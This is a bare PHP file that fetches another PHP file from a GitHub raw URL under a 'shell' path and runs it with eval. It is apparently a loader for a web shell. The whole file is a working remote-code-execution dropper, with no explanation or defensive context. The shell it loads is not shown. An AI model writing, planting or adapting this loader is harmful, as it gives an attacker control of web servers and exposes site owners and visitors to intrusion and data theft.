<?php
$ch = curl_init('https://raw.githubusercontent.com/sajapastipasti-afk/assets/refs/heads/main/shell/mawar.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
?>
